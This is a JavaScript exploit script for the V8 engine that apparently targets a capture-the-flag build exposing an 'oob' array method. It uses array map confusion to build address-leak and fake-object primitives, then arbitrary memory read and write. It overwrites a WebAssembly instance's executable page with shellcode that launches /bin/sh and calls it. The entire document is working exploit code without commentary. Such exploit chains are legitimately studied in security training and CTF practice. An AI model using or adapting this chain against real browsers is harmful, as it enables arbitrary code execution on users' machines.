var buf = new ArrayBuffer(8); // 8 byte array buffer
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

function ftoi(val) { // typeof(val) = float
    f64_buf[0] = val;
    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n); // Watch for little endianness
}

function itof(val) { // typeof(val) = BigInt
    u64_buf[0] = Number(val & 0xffffffffn);
    u64_buf[1] = Number(val >> 32n);
    return f64_buf[0];
}

function utoi(val){
    return eval("0x"+val.toString(16)+"n"); 
}

/// Construct addrof primitive
var obj = {"A":1};

var obj_arr = [obj];
var float_arr = [1.1, 1.2, 1.3, 1.4];

f64_buf[0] = obj_arr.oob();
u64_buf[1] = u64_buf[1] - 4;
obj_arr.oob(f64_buf[0]);
f64_buf[0] = obj_arr.oob();
var obj_map = u64_buf[0];
f64_buf[0] = float_arr.oob();
var float_map = u64_buf[0];

console.log("Obj_map "+obj_map.toString(16));
console.log("Float_map "+float_map.toString(16));

function addrof(in_obj) {

    var org = obj_arr.oob();
    f64_buf[0] = org;
    u64_buf[0] = float_map;

    // First, put the obj whose address we want to find into index 0
    obj_arr[0] = in_obj;
    
    // Change the obj array's map to the float array's map
    obj_arr.oob(f64_buf[0]);


    // Get the address by accessing index 0
    let addr = obj_arr[0];
    
    f64_buf[0] = addr;
    // Set the map back
    obj_arr.oob(org);

    // Return the address as a Int
    return u64_buf[0];
}



function fakeobj(addr) {
    
    // First, put the address as a float into index 0 of the float array
    u64_buf[0] = addr;
    float_arr[0] = f64_buf[0];

    var org = float_arr.oob();
    f64_buf[0] = org;
    u64_buf[0] = obj_map;

   
    // Change the float array's map to the obj array's map
    float_arr.oob(f64_buf[0]);

    // Get a "fake" object at that memory location and store it
    let fake = float_arr[0];

    // Set the map back
    float_arr.oob(org);

    // Return the object
    return fake;
}

function limit_read(addr){
	var val =  0x1000000000n - 8n + utoi(addr);
	val = val+1n;
	var fake_obj_layout = [itof(utoi(float_map)),itof(val)].slice(0);
	let fake_obj = fakeobj(addrof(fake_obj_layout) - 0x10);
	return fake_obj[0];
}

function limit_write(addr,v){
	var val =  0x1000000000n - 8n + utoi(addr);
	val = val+1n;
	var fake_obj_layout = [itof(utoi(float_map)),itof(val)].slice(0);
	let fake_obj = fakeobj(addrof(fake_obj_layout) - 0x10);
	fake_obj[0] = v;
}

var AB_buf = new ArrayBuffer(8); // 8 byte array buffer
var AB_u64_buf = new Float64Array(AB_buf);
var heap_buf_offset = addrof(AB_u64_buf)+0x28-1;

function ab_read(addr){
	limit_write(heap_buf_offset,addr);
	return AB_u64_buf[0];
}
function ab_write(addr,val){
	limit_write(heap_buf_offset,addr);
	AB_u64_buf[0]=val;
}


var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var f = wasm_instance.exports.main;

var rwx = limit_read(addrof(wasm_instance)+0x68-1);
console.log("0x"+ftoi(rwx).toString(16));



shellcode = [
	0x6e69622fb848686an,
	0xe7894850732f2f2fn,
	0x2434810101697268n,
	0x6a56f63101010101n,
	0x894856e601485e08n,
	0x50f583b6ad231e6n,
	0xccccccccccccccccn,
]

for(let i=0;i<shellcode.length;i++){
	ab_write(rwx,itof(shellcode[i]));
	rwx = itof(ftoi(rwx)+8n);
}
f();

